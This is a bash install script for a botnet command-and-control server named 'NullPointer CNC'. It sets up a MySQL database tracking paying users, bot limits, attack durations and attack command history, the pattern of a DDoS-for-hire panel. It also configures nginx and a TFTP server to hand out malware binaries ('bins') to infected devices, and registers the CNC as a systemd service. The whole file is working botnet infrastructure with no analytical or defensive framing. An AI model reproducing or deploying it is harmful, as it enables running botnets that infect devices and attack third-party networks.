#!/bin/bash

set -e

INSTALL_DIR="/opt/nullpointer"
CONFIG_DIR="/etc/nullpointer"

echo "[*] NullPointer CNC setup"

apt-get update
apt-get install -y mysql-server nginx xinetd tftpd-hpa

systemctl start mysql 2>/dev/null || systemctl start mariadb 2>/dev/null || true
mysql -e "CREATE DATABASE IF NOT EXISTS NullPointer;" 2>/dev/null || true
mysql -e "CREATE USER IF NOT EXISTS 'nullpointer'@'localhost' IDENTIFIED BY 'nullpointer'; GRANT ALL ON NullPointer.* TO 'nullpointer'@'localhost'; FLUSH PRIVILEGES;" 2>/dev/null || true
mysql NullPointer -e "
CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(32),
  password VARCHAR(32),
  max_bots INT DEFAULT -1,
  admin INT DEFAULT 0,
  last_paid INT,
  cooldown INT DEFAULT 0,
  duration_limit INT DEFAULT 0,
  api_key VARCHAR(64)
);
CREATE TABLE IF NOT EXISTS logins (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(32), action VARCHAR(16), ip VARCHAR(16));
CREATE TABLE IF NOT EXISTS whitelist (prefix VARCHAR(16), netmask TINYINT);
CREATE TABLE IF NOT EXISTS history (id INT AUTO_INCREMENT PRIMARY KEY, user_id INT, time_sent INT, duration INT, command VARCHAR(256), max_bots INT);
" 2>/dev/null || true

mkdir -p "$INSTALL_DIR"
mkdir -p "$CONFIG_DIR"
cp -f cnc/config.json "$INSTALL_DIR/" 2>/dev/null || cp -f config.json "$INSTALL_DIR/" 2>/dev/null || true

mkdir -p /var/www/html/bins
cat > /etc/nginx/sites-available/nullpointer << 'NGX'
server {
    listen 80 default_server;
    root /var/www/html;
    location /bins/ { }
}
NGX
ln -sf /etc/nginx/sites-available/nullpointer /etc/nginx/sites-enabled/ 2>/dev/null || true
systemctl reload nginx 2>/dev/null || true

mkdir -p /var/lib/tftpboot
sed -i 's/^TFTP_DIRECTORY=.*/TFTP_DIRECTORY="\/var\/lib\/tftpboot"/' /etc/default/tftpd-hpa 2>/dev/null || true
systemctl restart tftpd-hpa 2>/dev/null || true

echo 'MYSQL_ADDR=127.0.0.1:3306
MYSQL_USER=root
MYSQL_PASS=root' > "$CONFIG_DIR/cnc.env"

cp -f "$(dirname "$0")/nullpointer-cnc.service" /etc/systemd/system/ 2>/dev/null || cp nullpointer-cnc.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable nullpointer-cnc

echo "[*] setup done. copy cnc binary to $INSTALL_DIR/cnc, bins to /var/www/html/bins, then: systemctl start nullpointer-cnc"
